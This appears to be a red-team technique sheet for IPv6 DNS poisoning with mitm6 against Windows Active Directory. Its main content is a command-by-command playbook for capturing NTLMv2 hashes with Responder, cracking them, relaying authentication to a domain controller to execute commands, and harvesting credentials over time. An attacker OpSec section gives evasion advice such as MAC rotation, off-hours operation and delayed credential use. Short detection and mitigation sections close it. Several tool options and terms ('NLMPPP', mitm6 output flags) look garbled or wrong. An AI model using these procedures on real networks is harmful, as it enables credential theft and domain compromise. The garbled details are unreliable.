# REC-AD-006: IPv6 DNS Poisoning with mitm6

**SERVTEP ID:** REC-AD-006  
**Technique Name:** IPv6 DNS poisoning with mitm6  
**MITRE ATT&CK Mapping:** T1557.001 (Adversary-in-the-Middle - LLMNR/NBT-NS Poisoning)  
**CVE Reference:** N/A  
**Environment:** Windows Active Directory  
**Severity:** Critical  
**Difficulty:** Medium  

---

## Executive Summary

IPv6 is enabled by default on modern Windows networks but often not monitored or secured. The mitm6 tool exploits this by poisoning IPv6 DNS traffic and intercepting authentication attempts. This enables credential capture, NTLM relay attacks, and domain controller impersonation. Networks that have disabled IPv4 fallback are particularly vulnerable. This reconnaissance technique can expose domain credentials without any direct target interaction.

---

## Objective

Leverage IPv6 DNS poisoning to:
- Intercept DNS queries and redirect traffic
- Capture NTLM authentication credentials
- Perform NTLM relay attacks to domain controllers
- Obtain domain controller credentials
- Extract password hashes via responder integration
- Enumerate active hosts via DNS interception
- Identify domain services and their locations

---

## Prerequisites

- Network access to target subnet (Layer 2)
- Linux system with mitm6 tool
- Kali Linux or similar pentest OS
- Root/administrator privileges on attacker system
- Optional: Responder integration for credential capture
- Python 3.6+ with required modules

---

## Execution Procedures

### Method 1: mitm6 Installation and Basic Setup

**Step 1:** Install mitm6
```bash
# Clone mitm6 repository
git clone https://github.com/dirkjanm/mitm6
cd mitm6

# Install dependencies
pip install -r requirements.txt

# Alternatively, install via pip
pip install mitm6

# Verify installation
mitm6 --version
```

**Step 2:** Identify target network
```bash
# Get network interface information
ip addr show

# Identify IPv6 enabled networks
ip -6 addr show

# Scan for IPv6 hosts
nmap -6 -sn fe80::/10

# Get MAC addresses of active hosts
arp-scan -l

# Identify Windows systems (often have specific behavior)
ping6 ff02::1%eth0  # Link-local multicast
```

### Method 2: Basic mitm6 Execution

**Step 1:** Start mitm6 on target network
```bash
# Run mitm6 on specific interface
sudo mitm6 -i eth0 -d example.com

# Options:
# -i : Network interface to listen on
# -d : Target domain
# -w : Write output file
# -v : Verbose output

# Example with verbose output
sudo mitm6 -i eth0 -d example.com -w mitm6_output -v
```

**Step 2:** Monitor captured traffic
```bash
# mitm6 captures in real-time
# Captured information:
# - DNS queries and responses
# - DHCP requests
# - NLMPPP authentication attempts
# - Computer names and domain info

# Check captured data
tail -f mitm6_output
```

### Method 3: DNS Poisoning and Credential Capture

**Step 1:** Integrate with Responder for credential capture
```bash
# Start Responder in listening mode
sudo responder -I eth0 -wd

# Options:
# -I : Network interface
# -w : Enable WPAD abuse
# -d : Enable DHCP spoofing (with mitm6)

# In parallel, run mitm6
sudo mitm6 -i eth0 -d example.com

# Responder will capture:
# - NTLM hashes
# - LLMNR/NBT-NS responses
# - Authentication attempts
```

**Step 2:** Capture and analyze credentials
```bash
# Responder saves captured hashes to:
# /usr/share/responder/logs/

# View captured hashes
cat /usr/share/responder/logs/*.txt

# Extract NTLM hashes
grep "NTLMv2" /usr/share/responder/logs/* | cut -d: -f3-

# Crack captured hashes offline
hashcat -m 5600 captured_hashes.txt /path/to/wordlist.txt
```

### Method 4: NTLM Relay via mitm6

**Step 1:** Set up NTLM relay chain
```bash
# Start mitm6
sudo mitm6 -i eth0 -d example.com

# Start NTLM relay (ntlmrelayx or similar)
python3 -m impacket.ntlmrelayx -t ldap://192.168.1.100 \
  -ip 192.168.1.200 \
  -c "whoami" \
  -l mitm6_relay.log

# When a user browses the poisoned DNS:
# 1. mitm6 redirects to attacker
# 2. User authenticates via NTLM
# 3. Relay forwards to domain controller
# 4. Execute commands as authenticated user
```

**Step 2:** Monitor relay results
```bash
# Check relay logs
tail -f mitm6_relay.log

# If successful, you'll see:
# - "Authenticated as: DOMAIN\USERNAME"
# - Command execution output
```

### Method 5: Advanced mitm6 Enumeration

**Step 1:** Extract domain information via DNS poisoning
```bash
# mitm6 intercepts all DNS queries
# Log shows:
# - Computer names being resolved
# - Service records (SRV records)
# - Domain controller locations
# - Forest information (forest.root)

# Analyze captured DNS queries
# Look for:
# - DC hostnames (DC01, DC02)
# - Exchange servers (mail, exchange)
# - Print servers (printer, print)
# - File servers (file, share, smb)
```

**Step 2:** Identify network topology
```bash
# DNS queries reveal:
# - Subdomain structure
# - Site topology
# - Service locations
# - Server naming conventions

# Extract and analyze
grep "A record" mitm6_output | sort | uniq -c | sort -rn
```

### Method 6: Stealthy mitm6 Operation

**Step 1:** Minimize detection footprint
```bash
# Don't relay to DC immediately (suspicious)
# Instead:
# 1. Capture credentials
# 2. Wait for normal activity
# 3. Use credentials at later time/location

# Rotate interface MAC address
ip link set eth0 address 00:11:22:33:44:55

# Use dynamic IP to appear legitimate
sudo dhclient eth0
```

**Step 2:** Long-running credential harvesting
```bash
# Set up background mitm6 process
nohup sudo mitm6 -i eth0 -d example.com -w harvest.log &

# Monitor periodically
tail -f harvest.log | grep "NTLMv2"

# Collect hashes for offline cracking
watch -n 300 'cat /usr/share/responder/logs/*.txt | grep -E "NTLMv2|v1" >> hashes.txt'
```

---

## Technical Deep Dive

### IPv6 Attack Flow

1. **DHCPv6 Solicitation** - Attacker responds faster than legitimate server
2. **Router Advertisement** - Attacker announces itself as router
3. **DNS Poisoning** - Attacker intercepts DNS queries
4. **Credential Capture** - User traffic redirected to attacker
5. **NTLM Relay** - Forward authentication to domain controller

### Why IPv6?

- Often disabled in logging/monitoring
- Windows prioritizes IPv6 over IPv4
- Fewer organizations monitor IPv6 traffic
- Default Windows behavior trusts IPv6 more

---

## Detection Strategies (Blue Team)

### IPv6 Traffic Monitoring

1. **Detect Rogue Router Advertisements**
   - Monitor for RA (Router Advertisement) messages
   - Alert on unexpected router announcements
   - Track DHCPv6 server responses

2. **DNS Poisoning Detection**
   - Monitor DNS responses from unexpected sources
   - Alert on IPv6 DNS responses
   - Check for DNS responses from non-DNS servers

3. **NTLM Authentication Monitoring**
   - Alert on NTLM relay attempts (unusual relay patterns)
   - Monitor for failed NTLM auth (sign of relay)
   - Track authentication from unusual sources

### Sysmon Rules

```
Event ID 3: Network Connection
Alert on: Connections to IPv6 addresses from non-standard processes
```

---

## Operational Security (OpSec) Considerations

### Attacker Perspective

1. **Network Stealth**
   - Operate on off-hours (lower monitoring)
   - Rotate MAC addresses periodically
   - Use wireless if possible (less logging)

2. **Credential Usage**
   - Don't immediately use captured credentials
   - Use from different network (harder to correlate)
   - Space out credential usage over time

### Defensive Measures

1. **IPv6 Hardening**
   - Disable IPv6 if not needed
   - Enable DHCP snooping for IPv6
   - Implement Router Advertisement (RA) guard
   - Monitor IPv6 traffic

2. **NTLM Hardening**
   - Disable NTLM if possible (use Kerberos only)
   - Sign NTLM authentication
   - Implement MFA to bypass NTLM attacks

---

## Mitigation Strategies

1. **Immediate Actions**
   - Monitor IPv6 traffic
   - Check for DHCPv6 rogue servers
   - Review recent NTLM authentications

2. **Detection & Response**
   - Enable IPv6 monitoring
   - Alert on RA and DHCPv6 anomalies
   - Monitor for NTLM relay patterns

3. **Long-term Security**
   - Implement IPv6 security (RA guard, DHCP snooping)
   - Disable NTLM if possible
   - Use Kerberos exclusively
   - Implement MFA for sensitive accounts
   - Network segmentation (VLAN isolation)

---

## References & Further Reading

- [mitm6 GitHub Repository](https://github.com/dirkjanm/mitm6)
- [IPv6 Security Best Practices](https://tools.ietf.org/html/rfc7123)
- [NTLM Relay Attacks](https://posts.specterops.io/from-ntlmrelay-to-rce-e6bff701494a)

---

## Related SERVTEP Techniques

- **CA-FORCE-001**: SCF/URL file NTLM trigger
- **CA-FORCE-002**: .library-ms NTLM hash leakage
- **CA-BRUTE-001**: Azure portal password spray

---

## Timeline

| Phase | Duration | Difficulty |
|-------|----------|------------|
| Setup | 5-10 minutes | Easy |
| Credential capture | 10+ minutes | Medium |
| NTLM relay | 5-15 minutes | Medium |
| Full exploitation | 15-30 minutes | Medium |

---

**Last Updated:** December 2025  
**Classification:** SERVTEP Research Division  
**Status:** Verified & Operational
